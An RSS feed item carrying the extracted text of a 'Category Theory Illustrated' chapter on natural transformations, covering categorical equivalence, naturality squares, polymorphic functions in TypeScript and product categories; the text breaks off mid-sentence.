<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Hacker News: Front Page</title><link>https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml</link><description>Hacker News RSS</description><atom:link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Wed, 01 Oct 2025 16:13:06 +0000</lastBuildDate><item><title>Category Theory Illustrated – Natural Transformations</title><link>https://abuseofnotation.github.io/category-theory-illustrated/11_natural_transformations/</link><description>&lt;doc fingerprint="307d2805cbf1b5d"&gt;
  &lt;main&gt;&lt;quote&gt;&lt;p&gt;I didn’t invent categories to study functors; I invented them to study natural transformations. — Saunders Mac Lane&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;In this chapter, we will introduce the concept of a morphism between functors, or natural transformation. Understanding natural transformations will enable us to define category equality and some other advanced concepts.&lt;/p&gt;&lt;p&gt;Natural transformations really are at the heart of category theory, however, their importance is not obvious at first. So, before introducing them, I like to talk, once more, about the body of knowledge that this heart maintains (I am good with metaphors… in principle).&lt;/p&gt;&lt;p&gt;Our first section aims to introduce natural transformation as a motivating example for creating a way to say that two categories are equal. But for that, we need to understand what equal categories are and should be.&lt;/p&gt;&lt;p&gt;So, are you ready to hear about equivalent categories and natural transformations? Actually it is my opinion that you are not (no offence, they are just very hard!). So, we will take a longer route. I can put this next section anywhere in this book, and it would always be neither here nor there. But anyway, if you are studying math, you are probably interested in the nature of the universe. “What is the quintessential characteristic of all things in this world?” I hear you ask…&lt;/p&gt;&lt;quote&gt;&lt;p&gt;The world is the collection of facts, not of things. — Ludwig Wittgenstein&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;What is the quintessential characteristic of all things in this world? Some 2500 years ago, the philosopher Parmenides gave an answer to this question, postulating that the nature of the universe is permanence, stasis. According to his view, what we perceive as processes/transformations/change is merely illusory appearances (“Whatever is is, and what is not cannot be”). He said that that things never really change, they only appear to change, or (another way to put it), only appearances change, but the essence does not (I think this is pretty much how the word “essence” came to exist).&lt;/p&gt;&lt;p&gt;Although far from obviously true, his view is easy for people to relate to — objects are all around us, everything we “see”, both literally (in real life), or metaphorically (in mathematics and other disciplines), can be viewed as objects, persisting through space and time. If we subscribe to this view, then we would think that the key to understanding the world is understanding what objects are. In my opinion, this is what set theory does, to some extent, as well as classical logic (Plato was influenced by Parmenides when he created his theory of forms).&lt;/p&gt;&lt;p&gt;However, there is another way to approach the question about the nature of the universe, which is equally compelling. Because, what is an object, when viewed by itself? Can we study an object in isolation? And will there anything left to study about it, once it is detached from its environment? If a given object undergoes a process to get all of it’s part replaced, is it still the same object?&lt;/p&gt;&lt;p&gt;Asking such questions might lead us to suspect that, although what we see when we look at the universe are the objects, it is the processes/relations/transitions or morphisms between the objects that are the real key to understanding it. For example, when we think hard about everyday objects we realize that each of them has a specific functions (note the term) without which, a thing would not be itself e.g. is a lamp that doesn’t glow, still a lamp? Is there food that is non-edible (or an edible item that isn’t food)? And this is even more valid for mathematical objects, which, without the functions that go between them, are not objects at all.&lt;/p&gt;&lt;p&gt;So, instead of thinking about objects that just happen to have some morphisms between them, we might take the opposite view and say that objects are only interesting as sources and targets of morphisms.&lt;/p&gt;&lt;p&gt;Although old, dating back to Parmenides’ alleged rival Heraclitus, this view has been largely unexplored, until the 20th century, when a real mathematical revolution happened: Bertrand Russell created type theory, his student Ludwig Wittgenstein wrote a little book, from which the above quote comes, and this book inspired a group of mathematicians and logicians, known as the “Vienna circle”. Part of this group was Rudolph Carnap who coined the word “functor”…&lt;/p&gt;&lt;p&gt;An embodiment of Heraclitus’ view in the realm of category theory is the concept of isomorphism invariance that we implicitly touched several times.&lt;/p&gt;&lt;p&gt;All categorical constructions that we covered (products/coproducts, initial/terminal objects, functional objects in logic) are isomorphism-invariant. Or, equivalently, they define an objects up to an isomorphism. Or, in other words, if there are two or more objects that are isomorphic to one another, and one of them has a given property, then the rest of them would to also have this property as well.&lt;/p&gt;&lt;p&gt;In short, in category theory isomorphism = equality.&lt;/p&gt;&lt;p&gt;The key to understanding category theory lies in understanding isomorphism invariance. And the key to understanding isomorphism invariance are natural transformations.&lt;/p&gt;&lt;p&gt;Let’s return to the question that we were pondering at the beginning of the previous chapter — what does it mean for two categories to be equal?&lt;/p&gt;&lt;p&gt;In the prev chapter, we talked a lot about how great isomorphisms are and how important they are for defining the concept of equality in category theory, but at the same time we said that categorical isomorphisms do not capture the concept of equality of categories.&lt;/p&gt;&lt;p&gt;This is because (though it may seem contradictory at first) categorical isomorphisms are not isomorphism invariant, i.e. categories that only differ by having some additional isomorphic objects aren’t isomorphic themselves.&lt;/p&gt;&lt;p&gt;For this reason, we need a new concept of equality of categories. A concept that would elucidate the differences between categories with different structure, but also the sameness of categories that have the same categorical structures, disregarding the differences that are irrelevant for category-theoretic standpoint. That concept is equivalence.&lt;/p&gt;&lt;p&gt;Parmenides: This category surely cannot be equal to the other one — it has a different amount of objects!&lt;/p&gt;&lt;p&gt;Heraclitus: Who cares bro, they are isomorphic.&lt;/p&gt;&lt;p&gt;To understand equivalent categories better, let’s go back to the functor between a given map and the area it represents (we will only consider the thin categories (AKA orders) for now). This functor would be invertible (and the categories — isomorphic) when the map should represent the area completely i.e. there should be arrow for each road and a point for each little place.&lt;/p&gt;&lt;p&gt;Such a map is necessary if your goal is to know about all places, however, like we said, when working with category theory, we are not so interested in places, but in the routes that connect them i.e. we focus not on objects but on morphisms.&lt;/p&gt;&lt;p&gt;For example, if there are intersections that are positioned in such a way that there are routes from one and to the other and vice-versa a map may collapse them into one intersection and still show all routes that exist (the tree routes would be represented by the “identity route”).&lt;/p&gt;&lt;p&gt;These two categories are not isomorphic — going from one of them to the other and back again doesn’t lead you to the same object.&lt;/p&gt;&lt;p&gt;However, going from one of them to the other would lead you at least to an isomorphic object.&lt;/p&gt;&lt;p&gt;In this case we say that the orders are equivalent.&lt;/p&gt;&lt;p&gt;We know that two orders are isomorphic if there are two functors, such that going from one to the other and back again leads you to the same object.&lt;/p&gt;&lt;p&gt;And two orders are equivalent if going from one of them to the other and back again leads you to the same object, or to an object that is isomorphic to the one you started with.&lt;/p&gt;&lt;p&gt;But when does this happen? To understand this, we plot the orders as a Hasse diagram.&lt;/p&gt;&lt;p&gt;You can see that, although not all objects are connected one-to-one, all objects at a given level are connected to objects of the corresponding level.&lt;/p&gt;&lt;p&gt;To formalize that notion, we remember the concept of equivalence classes that we covered in the chapter about orders. Let’s visualize the relationship of the equivalence classes of the two orders that we saw above.&lt;/p&gt;&lt;p&gt;You can see that they are isomorphic. And that is no coincidence: two orders are equivalent precisely when the orders made of their equivalence classes are isomorphic.&lt;/p&gt;&lt;p&gt;This is a definition for equivalence of orders, but unfortunately, it does not hold for all categories — when we are working with orders, we can get away by just thinking about objects, but categories demands that we think about morphisms i.e. to prove two categories are equivalent, we should establish an isomorphism between their morphisms.&lt;/p&gt;&lt;p&gt;For example, the following two categories are not equivalent, although their equivalence classes are isomorphic — the category on the left has just one morphism, but the category on the right has two.&lt;/p&gt;&lt;p&gt;One way of defining equivalence of categories is by generalizing the notion of equivalence classes of orders to what we call skeletons of categories, a skeleton of a category being a subcategory in which all objects that are isomorphic to one another are “merged” into one object (isomorphic objects are necessarily identical).&lt;/p&gt;&lt;p&gt;However, we will leave this (pardon my French) as an exercise for the reader. Why? We already did this when we generalized the notion of normal set-theoretic functions to functors, and so it makes more sense to build up on that notion. Also, we need a motivating example for introducing natural transformations, remember?&lt;/p&gt;&lt;p&gt;In the chapter about orders, we presented a definition of order isomorphisms, that is based on objects:&lt;/p&gt;&lt;quote&gt;&lt;p&gt;An order isomorphism is essentially an isomorphism between the orders’ underlying sets (invertible function). However, besides their underlying sets, orders also have the arrows that connect them, so there is one more condition: in order for an invertible function to constitute an order isomorphism it has to respect those arrows, in other words it should be order preserving. More specifically, applying this function (let’s call it $F$) to any two elements in one set ($a$ and $b$) should result in two elements that have the same corresponding order in the other set (so $a ≤ b$ if and only if $F(a) ≤ F(b)$).&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;That a way to define them, but it is not the best way. Now that we know about functors (which, as we said, serve as functions between the orders and other categories), we can devise a new, simpler definition, which would also be valid for all categories, not just orders, and for all forms of equality (isomorphism and equivalence).&lt;/p&gt;&lt;p&gt;We begin with the definition of set isomorphism:&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Two sets $A$ and $B$ are isomorphic (or $A ≅ B$) if there exist functions $f: A \to B$ and its reverse $g: B \to A$, such that $f \circ g = ID_{B}$ and $g \circ f = ID_{A}$.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;To amend it so it is valid for all categories by just replacing the word “function” with “functor” and “set” with “category”:&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Two categories $A$ and $B$ are isomorphic (or $A \cong B$) if there exist functors $f: A \to B$ and its reverse $g: B \to A$, such that $f \circ g = ID_{B}$ and $g \circ f = ID_{A}$.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;Task 1: Check if that definition is valid.&lt;/p&gt;&lt;p&gt;Believe it or not, this definition, is just one find-and-replace operation away from the definition of equivalence. We get there only by replace equality with isomorphism (so, $=$ with $\cong$).&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Two categories $A$ and $B$ are equivalent (or $A \simeq B$) if there exist functors $f: A \to B$ and its reverse $g: B \to A$, such that $f \circ g \cong ID_{B}$ and $g \circ f \cong ID_{A}$.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;Like we said at the beginning, with isomorphisms, going back and forth brings us to the same object, while with equivalence the object is just isomorphic to the original one. This is truly all there is to it.&lt;/p&gt;&lt;p&gt;There is only one problem, though — we never said what it means for functors to be isomorphic.&lt;/p&gt;&lt;p&gt;So, how can we make the above definition “come to life”? The title of this chapter outlines the things we need to define:&lt;/p&gt;&lt;p&gt;If this sounds complicated, remember that we are doing the same thing we always did — talking about isomorphisms.&lt;/p&gt;&lt;p&gt;In the very first chapter of this book, we introduced set isomorphisms, which are quite easy, and now we reached the point to examine functor isomorphisms. So, we are doing the same thing. Although actually…&lt;/p&gt;&lt;p&gt;But actually, natural transformations are quite different from morphisms and functors, (the definition is not “recursive”, like the definitions of functor and morphism are). This is because functions and functors are both morphisms between objects (or 1-morphisms), while natural transformations are morphisms between morphisms (known as 2-morphisms).&lt;/p&gt;&lt;p&gt;But enough talking, let’s draw some diagrams. We know that natural transformations are morphisms between functors, so let’s draw two functors.&lt;/p&gt;&lt;p&gt;The functors have the same signature. Naturally. How else can there be morphisms between them?&lt;/p&gt;&lt;p&gt;Now, a functor is comprised of two mappings (object mapping and morphism mapping) so a mapping between functors, would consist of “object mapping mapping” and “morphism mapping mapping” (yes, I often do get in trouble with my choice of terminology, why do you ask?).&lt;/p&gt;&lt;p&gt;Let’s first connect the object mappings of the two functors, creating what we called “object mapping mapping”.&lt;/p&gt;&lt;p&gt;It is simpler than it sounds when we realize that we only need to connect the object in functors’ target category — the objects in the source category would just always be the same for both functors, as both functors would include all object from the source category (as that is what functors (and morphisms in general) do). In other words, mapping the two functors’ object components involves nothing more than specifying a bunch of morphisms in the target category: one morphism for each object in the source category i.e. each object from the image of the first functor, should have one arrow coming from it (and to an object of the second functor, so, for example, our current source category has two objects and we specify two morphisms.&lt;/p&gt;&lt;p&gt;Note that this mapping does not map every object from the target category, i.e. not all objects have arrows coming from them (e.g. here the black and blue square do not have arrows), although, in some cases, it might.&lt;/p&gt;&lt;p&gt;Task 2: When exactly would the mapping encompass all objects?&lt;/p&gt;&lt;p&gt;The morphism part might seem hard… until we realize that, once the connections between the object mappings are already established, there is only one way to connect the morphisms — we take each morphism of the source category and connect the two morphisms given by the two functors, in the target category. And that’s all there is to it.&lt;/p&gt;&lt;p&gt;Oh, actually, there is also this condition that the above diagram should commute (the naturality condition), but that happens pretty much automatically.&lt;/p&gt;&lt;p&gt;Just like anything else in category theory, natural transformations have some laws that they are required to pass. In this case it’s one law, typically called the naturality law, or the naturality condition.&lt;/p&gt;&lt;p&gt;Before we state this law, let’s recap where are we now: We have two functors $F$ and $G$ that have the same type signature (so $F : C \to D$ and $G : C \to D$ for some categories $C$ and $D$), and a family of morphisms in the target category $D$ (denoted $\alpha : F \Rightarrow G$) one for each object in $C$, that map each object of the target of the functor $F$ (or the image of $F$ in $D$ as it is also called) to some objects of the image of $G$. This is a transformation, but not necessarily a natural one. A transformation is natural, when this diagram commutes for all morphisms in $C$.&lt;/p&gt;&lt;p&gt;i.e. a transformation is natural when every morphism $f$ in $C$ is mapped to morphisms $F(f)$ by $F$ and to $G(f)$ by $G$ (not very imaginative names, I know), in such a way, that we have $\alpha \circ F(f) = G(f) \circ \alpha$ i.e. when starting from the white square, when going right and then down (via the yellow square) is be equivalent to going down and then right (via the black one).&lt;/p&gt;&lt;p&gt;We may view a natural transformation is a mapping between morphisms and commutative squares: two functors and a natural transformation between two categories means that for each morphism in the source category of the functors, there exist one commutative square at the target category.&lt;/p&gt;&lt;p&gt;When we fully understand this, we realize that commutative squares are made of morphisms too, so, like morphisms, they compose — for any two morphisms with appropriate type signatures that have we can compose to get a third one, we have two naturality squares which compose the same way.&lt;/p&gt;&lt;p&gt;Which means natural transformation make up a…&lt;/p&gt;&lt;p&gt;(Oh wait, it’s too early for that, is it?)&lt;/p&gt;&lt;p&gt;After understanding natural transformations, natural isomorphisms, are a no-brainer: a natural transformation is just a family of morphisms in a given category that satisfy certain criteria, then what would a natural isomorphism be? That’s right — it is a family of isomorphisms that satisfy the same criteria. The diagram is the same as the one for ordinary natural transformation, except that $\alpha$ are not just ordinary morphisms, but isomorphisms.&lt;/p&gt;&lt;p&gt;And the turning those morphisms into isomorphisms makes the diagram commute in more than one way i.e. if we have the naturality condition&lt;/p&gt;&lt;p&gt;$\alpha \circ F(f) = G(f) \circ \alpha$ i.e. the two paths going from white to blue are equivalent.&lt;/p&gt;&lt;p&gt;We also have:&lt;/p&gt;&lt;p&gt;$F(f) \circ \alpha = \alpha \circ G(f)$ i.e. the two paths going from black to yellow are also equivalent.&lt;/p&gt;&lt;p&gt;I am sorry, what were we talking about again? Oh yeah — categorical equivalence. Remember that categorical equivalence is the reason why we tackle natural transformations and isomorphisms? Or perhaps it was the other way around? Never mind, let’s recap what we discussed so far:&lt;/p&gt;&lt;p&gt;At the beginning of the section we introduced the notion of equivalence as two functors, such that going from one of them to the other and back again leads you to the same object, or to an object that is isomorphic to the one you started with.&lt;/p&gt;&lt;p&gt;And then, we discussed that for categories that are not thin (thick?) the situation is a bit more complex since they can have more than one morphism between two objects, and we should worry not only about isomorphic objects, but about isomorphic morphisms.&lt;/p&gt;&lt;p&gt;Now, we will show how these two notions are formalized by the definition that we presented.&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Two categories $A$ and $B$ are equivalent (or $A \simeq B$) if there exist functors $f: A \to B$ and its reverse $g: B \to A$, such that $f \circ g \cong ID_{A}$ and $g \circ f \cong ID_{A}$.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;To understand, this how are the two related, let’s construct the identity functor of the category that we have been using as an example all this time. Note that we are drawing the one and the same category two times (as opposed to just drawing an arrow coming from each object to itself), to make the diagrams more readable.&lt;/p&gt;&lt;p&gt;Then, we draw the composite of the two functors that establish an equivalence between the two categories, highlighting the 3 “interesting” objects, i.e. the ones due to which the categories aren’t isomorphic.&lt;/p&gt;&lt;p&gt;Now, we ask ourselves, in which cases does there exist an isomorphism between those two functors?&lt;/p&gt;&lt;p&gt;The answer becomes trivial if we draw the isomorphism arrows connecting the three “interesting” objects in a different way (remember, this is the same category on the top and the bottom) — we can see that these are exactly the arrows that enable us to construct an isomorphism between the two functors (the others are just identity arrows).&lt;/p&gt;&lt;p&gt;And when would this isomorphism be such that preserves the structure of the category (so that each morphism from the output of the composite functor has an equivalent one in the output of the identity)? Exactly when the isomorphism is natural i.e. when every morphism is mapped to a commuting square, e.g. here is the commuting square of the morphism that is marked in red.&lt;/p&gt;&lt;p&gt;i.e. naturality condition assures us that the morphisms in the target of the functor behave in the same way as their counterparts in the source.&lt;/p&gt;&lt;p&gt;With this, we are finished with categorical equivalence, but not with natural transformations — natural transformations are a very general concept, and categorical equivalences are only a very narrow case of them.&lt;/p&gt;&lt;p&gt;In the course of this book, we learned that programming/computer science is the study of the category of types in programming languages. However (in order to avoid this being too obvious) in the computer science context, we use different terms for the standard category-theoretic concepts.&lt;/p&gt;&lt;p&gt;We learned that objects are known as types, products and coproducts are, respectively, objects/tuple types and sum types. And, in the last chapter, we learned that functors are known as generic types. Now it’s the time to learn what natural transformations are in this context. They are known as (parametrically) polymorphic functions.&lt;/p&gt;&lt;p&gt;Now, suppose this sounds a bit vague. If only we had some example of a natural transformation in programming, that we can use… But wait, we did show a natural transformation in the previous chapter, when we talked about pointed functors.&lt;/p&gt;&lt;p&gt;That’s right, a functor is pointed when there is a natural transformation between it and the identity functor i.e. to have one green arrow for every object/type.&lt;/p&gt;&lt;p&gt;And this clearly is a natural transformation. As a matter of fact, if we get down to the nitty-gritty, we would see that it resembles a lot the equivalence diagram that we saw earlier — both transformations involve the identity functor, and both transformations have the same category as source and target, that’s why we can put everything in one circle (we don’t do that in the equivalence diagram, but that’s just a matter of presentation).&lt;/p&gt;&lt;p&gt;Actually, the only difference between the two transformations is that an equivalence is defined by a natural natural isomorphism of a given functors to the identity functor ( $ID \cong f \circ g $ and $ID \cong g \circ f$), while a pointed functor is defined by a one-way natural transformation from the identity functor ($ID \to f $) i.e. the equivalence functor is pointed, but not the other way around).&lt;/p&gt;&lt;p&gt;We said that a natural transformation is equivalent to a (parametrically) polymorphic function in programming. But wait, wasn’t natural transformation something else (and much more complicated):&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Two functors $F$ and $G$ that have the same type signature (so $F : C \to D$ and $G : C \to D$ for some categories $C$ and $D$), and a family of morphisms in the target category $D$ (denoted $\alpha : F \Rightarrow G$) one for each object in $C$. Morphisms that map each object of the target of $F$ (or the image of $F$ in $D$ as it is also called) to some object in the target of $G$.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;Indeed it is (I wasn’t lying to you, in case you are wondering), however, in the case of programming, the source and target categories of both functors are the same category ($Set$), so the whole condition regarding the functors’ type signatures can be dropped.&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Two&lt;/p&gt;&lt;del&gt;functors&lt;/del&gt;generic types $F$ and $G$&lt;del&gt;that have the same type signature&lt;/del&gt;and a family of morphisms in $Set$ (denoted $\alpha : Set \Rightarrow Set$) one for each object in $Set$, that map each target object of the functor $F$ (or the image of $F$ in $D$ as it is also called) to some target objects of functor $G$.&lt;/quote&gt;&lt;p&gt;As we know from the last chapter, a functor in programming is a generic type (which, has to have the &lt;code&gt;map&lt;/code&gt; function with the appropriate signature).&lt;/p&gt;&lt;p&gt;And what is a “family of morphisms in $Set$ one for each object in $Set$”? Well, the morphisms in the category $Set$ are functions, so that’s just a bunch of functions, one for each type. In Haskell notation, if we denote a random type by the letter \(a\)), it is $alpha : \forall a. F a \to G a$. But that’s exactly what polymorphic functions are.&lt;/p&gt;&lt;p&gt;Here is how would we write the above definition in a more traditional language (we use capital &lt;code&gt;&amp;lt;A&amp;gt;&lt;/code&gt; instead of $a$, as customary.&lt;/p&gt;&lt;code&gt;
function alpha&amp;lt;A&amp;gt;(a: F&amp;lt;A&amp;gt;) : G&amp;lt;A&amp;gt; {
}

&lt;/code&gt;&lt;p&gt;Generic types work by replacing the &lt;code&gt;&amp;lt;A&amp;gt;&lt;/code&gt; with some concrete type, like &lt;code&gt;string&lt;/code&gt;, &lt;code&gt;int&lt;/code&gt; etc. Specifically, the natural transformation from the identity functor to the list functor that puts each value in a singleton list looks like this $alpha :: \forall\ a. a \to List\ a$. Or in TypeScript:&lt;/p&gt;&lt;code&gt;
function array&amp;lt;A&amp;gt;(a: A) : Array&amp;lt;A&amp;gt; {
    return [a]
}
&lt;/code&gt;&lt;p&gt;Once we rid ourselves of the feeling of confusion, that such an excessive amount of new terminology and concepts impose upon us (which can take years, by the way), we realize that there are, of course, many polymorphic functions/natural transformations that programmers use.&lt;/p&gt;&lt;p&gt;For example, in the previous chapter, we discussed one natural transformation/polymorphic function the function $\forall a.a \to [a]$ which puts every value in a singleton list. This function is a natural transformation between the identity functor and the list functor.&lt;/p&gt;&lt;p&gt;This is pretty much the only one that is useful with this signature (the others being $a \to [a, a]$, $a \to [a, a, a]$ etc.), but there are many examples with signature $list\ a \to list\ a$, such as the function to reverse a list.&lt;/p&gt;&lt;p&gt;…or take1 that retrieves the first element of a list&lt;/p&gt;&lt;p&gt;or flatten a list of lists of things to a regular list of things (the signature of this one is a little different, it’s $list\ list\ a \to list\ a$).&lt;/p&gt;&lt;p&gt;Task 3: Draw example naturality squares of the $reverse$ natural transformation.&lt;/p&gt;&lt;p&gt;Do the same for the rest of the transformations.&lt;/p&gt;&lt;p&gt;Before, we said that we shouldn’t worry too much about naturality, as it is satisfied every time. Statistically, however, this is not true — as far as I am concerned, about 99.999 percent of transformations aren’t really natural (I wonder if you can compute that percentage properly?). But at the same time, it just so happens (my favourite phrase when writing about maths) that all transformations that we care about are natural.&lt;/p&gt;&lt;p&gt;So, what does the naturality condition entail, in programming? To understand this, we construct some naturality squares of the transformations that we presented.&lt;/p&gt;&lt;p&gt;We choose two types that play the role of $a$, in our case $string$ and $num$ and one natural transformation, like the transformation between the identity functor and the list functor.&lt;/p&gt;&lt;p&gt;The diagram commute when for all functions $f$, applying the $Ff$, the mapped/lifted version of $f$ with one functor (in our case this is just $F f : string \to num$ cause it is the identity functor), followed by ($alpha :: F b \to G\ b$), is equivalent to applying ($alpha:: F a \to G\ a$), and then the mapped version of $f$ with the other functor (in our case $G f :: List\ a \to List\ b$) i.e.&lt;/p&gt;\[\alpha \circ F\ f \cong G\ f \circ \alpha\]&lt;p&gt;(in the programming world, you would also see it as something like $\alpha (map\ f x) = map\ f (\alpha x)$, but note that here $map$ function means two different things on the two sides, Haskell is just smart enough to deduce which $fmap$ to use).&lt;/p&gt;&lt;p&gt;And in TypeScript, when we are talking specifically about the identity functor and the list functor, the equality is expressed as:&lt;/p&gt;&lt;code&gt;[x].map(f) == [f(x)]
&lt;/code&gt;&lt;p&gt;So, is this equation true in our case? To verify it, we take one last peak at the world of values.&lt;/p&gt;&lt;p&gt;We acquire an $f$, that is, we a function that acts on simple values (not lists), such as the function $length : string \to num$, which returns the number of characters a string has and convert it, (or lift it, as the terminology goes) to a function that acts on more complex values, using the list functor, (and the higher-order function $map$).&lt;/p&gt;&lt;p&gt;Then, we take the input and output types for this function (in this case $string$ and $num$), and the two morphisms of a natural transformation (e.g the abstract function $\forall a.a \to [a]$) that correspond to those two types.&lt;/p&gt;&lt;p&gt;When we compose these two pairs of morphisms we observe that they indeed commute — we get two morphisms that are actually one and the same function.&lt;/p&gt;&lt;p&gt;The above square shows the transformation $\forall a.a \to [a]$ (which is between the identity functor and the list functor, here is another one, this time between the list functor and itself ($\forall a.[a] \to [a]$) — $reverse$&lt;/p&gt;&lt;p&gt;(and you can see that this would work not just for $length$, but for any other function).&lt;/p&gt;&lt;p&gt;So, why does this happen? Why do these particular transformations make up a commuting square for each and every morphism?&lt;/p&gt;&lt;p&gt;The answer is simple, at least in our specific case: the original, unlifted function $f :: a \to b$ (like our $length :: string \to num$) can only work on the individual values (not with structure), while the natural transformation functions, i.e. ones with signature $list :: a \to list\ a$ only alter the structure, and not individual values. The naturality condition just says that these two types of functions can be applied in any order that we please, without changing the end result.&lt;/p&gt;&lt;p&gt;This means that if you have a sequence of natural transformations that you want to apply, (such as $reverse$ , $take$, $flatten$ etc) and some lifted functions ($F f$, $F g$), you can mix and match between the two sequences in any way you like and you will get the same result e.g.&lt;/p&gt;\[take1 \circ reverse \circ F\ f \circ F\ g\]&lt;p&gt;is the same as&lt;/p&gt;\[take1 \circ F\ f \circ reverse \circ F\ g\]&lt;p&gt;…or…&lt;/p&gt;\[F\ f \circ F\ g \circ take1 \circ reverse\]&lt;p&gt;…or any other such sequence (the only thing that isn’t permitted is to flip the members of the two sequences — ($take1 \circ reverse$ is of course different from $reverse \circ take1$and if you have $F\ f \circ F\ g$, then $F\ g \circ F\ f$ won’t be permitted at all due to the different type signatures).&lt;/p&gt;&lt;p&gt;Task 4: Prove the above results, using the formula of the naturality condition.&lt;/p&gt;&lt;p&gt;“Unnatural”, or “non-natural” transformations (let’s call them just transformations) are mentioned so rarely, that we might be inclined to ask if they exist. The answer is “yes and no”. Why yes? On one hand, transformations, consist of an innumerable amount of morphisms, forming an ever more innumerable amount of squares and obviously nothing stops some of these squares to be non-commuting.&lt;/p&gt;&lt;p&gt;For example, if we substitute one morphism from the family of morphisms that make up the natural transformation with some other random morphism that has the same signature, all squares that have this morphism as a component would stop commuting.&lt;/p&gt;&lt;p&gt;This would result in something like an “almost-natural” transformation (e.g. an abstract function that reverses all lists, except lists of integers).&lt;/p&gt;&lt;p&gt;And in the category of sets, where morphisms are functions i.e. mappings between values, it is enough to move just one arrow of just one of those values in order to make the transformation “unnatural” (e.g. a function which reverses all lists, but one specific list).&lt;/p&gt;&lt;p&gt;Finally, if can just gather a bunch of random morphisms, one for each object, that fit the criteria, we get what I would call a “perfectly unnatural transformation” (but this is my terminology).&lt;/p&gt;&lt;p&gt;But, although they do exist, it is very hard to define non-natural transformations. For example, for categories that are infinite, there is no way to specify such “perfectly unnatural transformation” (ones where none of the squares commute) without resorting to randomness. And even transformations on finite categories, or the “semi-natural” transformations which we described above (the ones that include a single condition for a single value or type), are not possible to specify in some languages e.g. you can define such a transformation in Typescript, but not in Haskell.&lt;/p&gt;&lt;p&gt;To see why, let’s see what the type of a natural transformation is.&lt;/p&gt;\[\forall\ a.\ F a \to G a\]&lt;p&gt;The key is that the definition should be valid for all types a. For this reason, there is no way for us to specify a different arrows for different types, without resorting to type downcasting, which is not permitted in languages like Haskell (as it breaks the principle of parametricity).&lt;/p&gt;&lt;p&gt;Now, after we saw the definition of natural transformations, it is time to see the definition of natural transformations (and if you feel that the quality of the humour in this book is deteriorating, that’s only because things are getting serious).&lt;/p&gt;&lt;p&gt;Let’s review again the commuting diagram that represents a natural transformation.&lt;/p&gt;&lt;p&gt;This diagram might prompt us into viewing natural transformations as some kind of “two-arrow functors” that have not one but two arrows coming from each of their morphisms — this notion, can be formalized, by using product categories.&lt;/p&gt;&lt;p&gt;Oh wait, I just realized we never covered product categories… but don’t worry, we will cover them now.&lt;/p&gt;&lt;p&gt;We haven’t covered product categories, however some pages ago, when we covered monoids and groups, we talked about the concept of a product group. The good news is that product categories are a generalization of product groups…&lt;/p&gt;&lt;p&gt;The bad news is that you probably don’t remember much about product groups, as covered them briefly.&lt;/p&gt;&lt;p&gt;But don’t worry, we will do a more in-depth treatment now:&lt;/p&gt;&lt;p&gt;Given two groups $G$ and $H$, whose sets of elements can also be denoted $G$ and $H$…&lt;/p&gt;&lt;p&gt;(in this example we use two boolean groups, which we visualize as the groups of horizontal and vertical rotation of a square)&lt;/p&gt;&lt;p&gt;…the product group of these two groups is a group that has the cartesian product of these two sets $G \times H$ as its set of elements.&lt;/p&gt;&lt;p&gt;And what can the group operation of such a group be? Well, I would say that out of the few possible groups operations for this set that exist, this is the only operation that is natural (I didn’t intend to involve natural transformation at this section, but they really do appear everywhere). So, let’s try to derive the operation of this group.&lt;/p&gt;&lt;p&gt;We know what a group operation is, in principle: A group operation combines two elements from the group into a third element i.e. it is a function with the following type signature:&lt;/p&gt;\[\circ : (A, A) \to A\]&lt;p&gt;or equivalently&lt;/p&gt;\[\circ : A \to A \to A\]&lt;p&gt;And for product groups, we said that the underlying set of the group (which we dubbed $A$ above) is a cartesian product of some other two sets which we dubbed $G$ and $H$. So, when we swap $A$ for $G \times H$ the definition becomes:&lt;/p&gt;\[\circ : G \times H \to G \times H \to G \times H\]&lt;p&gt;i.e. the group operation takes one pair of elements from $G$ and $H$ and another pair of elements from $G$ and $H$, only to return — guess what — a pair of elements $G$ and $H$.&lt;/p&gt;&lt;p&gt;Let’s take an example. To avoid confusion, we take two totally different groups — the color-mixing group and the group of integers under addition. That would mean that a value of $G \times H$ would be a pair, containing a random color and a random number, and the operation would combine two combine two such pairs and produce another one.&lt;/p&gt;&lt;p&gt;Now, the operation must produce a pair, containing a number and a color. Furthermore, it would be good if it produces a number by using those two numbers, not just picking one at random, and likewise for colors. And furthermore, we want it to work not just for monoids of numbers and colors, but all other monoids that can be given to us. It is obvious that there is only one solution, to get the elements of the new pair by combining the elements of the pairs given.&lt;/p&gt;&lt;p&gt;And the operation of the product group of the two boolean groups which we presented earlier is the combination of the two operations&lt;/p&gt;&lt;p&gt;So, the general definition of the operation is the following ($g1$, $g2$ are elements of $G$ and $h1$ and $h2$ elements of $H$).&lt;/p&gt;\[(g1, h1) \circ (g2, h2) = ( (g1 \circ g2), (h1 \circ h2))\]&lt;p&gt;And that are product groups.&lt;/p&gt;&lt;p&gt;We are back at tackling product categories.&lt;/p&gt;&lt;p&gt;Since we know what product groups are, and we know that groups are nothing but categories with just one object (and the group objects are the category’s morphisms, remember?), we are already almost there.&lt;/p&gt;&lt;p&gt;Here is a way to make a product category.&lt;/p&gt;&lt;p&gt;Take any two categories:&lt;/p&gt;&lt;p&gt;Then take the set of all possible pairs of the objects of these categories.&lt;/p&gt;&lt;p&gt;And, finally, we make a category out of that set by taking all morphisms coming from any of the two categories and replicate them to all pairs that feature some objects from their type signature, in the same way as we did for product groups (in this example, only one of the categories has morphisms).&lt;/p&gt;&lt;p&gt;This is the product category of the two 